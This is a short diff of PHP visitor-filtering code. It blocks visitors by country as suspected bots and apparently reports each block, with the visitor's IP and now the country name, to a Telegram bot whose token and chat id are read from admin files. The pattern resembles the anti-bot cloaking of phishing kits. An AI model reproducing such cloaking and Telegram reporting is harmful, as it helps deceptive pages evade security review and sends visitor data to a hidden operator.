@@ -170,7 +170,7 @@ if ($countrycode == "US") {
 } elseif ($countrycode == "BD") {
 
         } else {
-        $content = "Bot Found: ".$IP.$countrycode." [ Blocked ] \r\n";
+        $content = "Bot Found: ".$IP." : ".$countryname." [ Blocked ] \r\n";
 $token = file_get_contents("admin/tmp/token.txt");
 $id = file_get_contents("admin/tmp/id.txt");
 $url = "https://api.telegram.org/bot";
